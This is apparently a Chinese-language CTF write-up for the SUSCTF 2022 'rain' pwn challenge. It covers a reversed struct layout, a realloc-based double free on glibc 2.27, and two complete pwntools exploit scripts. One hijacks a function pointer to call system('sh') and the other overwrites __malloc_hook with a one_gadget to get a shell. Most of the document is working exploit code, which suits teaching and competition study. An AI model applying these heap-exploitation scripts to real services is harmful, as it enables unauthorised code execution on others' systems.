---
title: SUSCTF-2022-rain-writeup
date: 2022-03-29 19:23:07
categories:
 - pwn-writeup
tags: 
 - SUSCTF
 - tcache-attack
---
<!--more-->

### 本文提供了两种解题办法:

 - 标准做法: got-hijacking
 - 开启`PIE`的且不调用`Raining`刷新结构体的情况

## 题目概述
这道题的主要难点在逆向上，题目的逻辑比较复杂，不过不需要完全逆完.  

libc版本是2.27，可以轻松地在tcache上构造double_free.  

### 结构体分析

根据generate和show等函数就可以把题目的主要结构体猜个大概:  

```
00000000 screen          struc ; (sizeof=0x40, mappedto_8)
00000000 height          dd ?
00000004 width           dd ?
00000008 front_color     db ?
00000009 back_color      db ?
0000000A field_A         dd ?
0000000E field_E         dw ?
00000010 chars           dq ?
00000018 used            dq ?
00000020 rain_fall       dd ?
00000024 speed           dd ?
00000028 show            dq ?
00000030 alt_table       dq ?                    ; offset
00000038 table           dq ?                    ; offset
00000040 screen          ends
00000040
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 frame           struc ; (sizeof=0x13, mappedto_9)
00000000 height          db 4 dup(?)
00000004 width           dd ?
00000008 front_color     db ?
00000009 back_color      db ?
0000000A rain_fall       dd ?
0000000E field_E         dd ?
00000012 table           db ?
00000013 frame           ends
```

### 主要漏洞分析

 - 在`config`函数中使用`realloc`进行分配，size没有很好地控制，可以达到`free`的效果;
 - 题目没有开`PIE`，同时用`screen`结构体中的函数指针来调用`show`函数，可以考覆写该函数指针;

--------

## 利用

### 标准做法

```py
#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(" ")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./rain"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

cmd = lambda cho : p.sendlineafter(b'ch> ', str(cho).encode())
def debugPID():
    lg("p.pid")
    input()

def config(frame):
    cmd(1)
    ru(b'FRAME> ')
    sn(frame.ljust(18, b"\x00"))

config(p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(100) + p32(40000) + b"a"*0x40)
config(p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(0) + p32(40000))
config(p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(0) + p32(40000))
# debugPID()
cmd(3)
frame = p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(1) + p32(40000)
frame+= p32(0)+p32(0x40)+p8(2)+p8(1)+b'P'*0x6+p64(0)+p64(0)+p32(1)+p32(40000)+p64(0x400E17)+p64(e.got['atoi'])+p64(0xdeadbeef)
# debugPID()
config(frame)
# debugPID()
cmd(2)
ru(b"Table:")
libc_base = u64(ru(b"\n", "drop").replace(b" ", b"").ljust(8, b"\x00")) - l.symbols['atoi']
lg("libc_base")

config(p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(1) + p32(40000))
frame = p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(1) + p32(40000)
# debugPID()
frame+= b'sh\x00\x00' + p32(0x20)+p8(2)+p8(1)+b'P'*0x6+p64(0)+p64(0)+p32(1)+p32(40000)+p64(libc_base+l.symbols['system'])+p64(0xdeadbeef)*2
config(frame)
cmd(2)

irt()
```

### 开启`PIE`的且不调用`Raining`刷新结构体的情况

```py
#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(" ")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./rain"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

cmd = lambda cho : p.sendlineafter(b'ch> ', str(cho).encode())
def debugPID():
	lg("p.pid")
	input()

def config(frame):
	cmd(1)
	ru(b'FRAME> ')
	sn(frame.ljust(18, b"\x00"))

l.symbols['main_arena'] = 0x3ebc40
frame_0 = p32(0x50)*2+p8(2)+p8(1)+p32(0x64)*2

frame = frame_0 + b"a"*0x80
config(frame)
for i in range(8):
	config(frame_0)
cmd(2)
ru(b"Table:")
libc_base = u64(ru(b"\n").replace(b" ", b"").ljust(8, b"\x00")) - l.symbols['main_arena'] - 96
lg("libc_base")


frame = frame_0 + p64(libc_base+l.symbols['main_arena'])
config(frame)

frame = frame_0 + b"a"*0x60
config(frame)

for i in range(7):
	config(frame_0)
frame_1 = p32(1)+p32(0x60)+p8(2)+p8(1)+p32(0x64)*2
frame = frame_1 + p64(libc_base + l.symbols['__malloc_hook'] - 0x23)*12
config(frame)
frame = frame_0 + b"a"*0x90
config(frame)
config(frame_0)
frame = frame_0 + b"a"*0x10
config(frame)
frame = frame_0 + b"a"*0x60
config(frame)

config(frame_1 + b"a"*0x60)
frame_2 = p32(0)*2+p8(2)+p8(1)+p32(0x64)*2
frame = frame_2 + b"a"*0xc0
config(frame)
config(frame_2)

frame = frame_2 + b"a"*0x10
config(frame)

one_gadget = libc_base+0x10a45c
payload = b'\x00'*(0x13-8) + p64(one_gadget)
payload = frame_2+payload.ljust(0x60,b'\x00')
config(payload)
config(payload)

irt()
```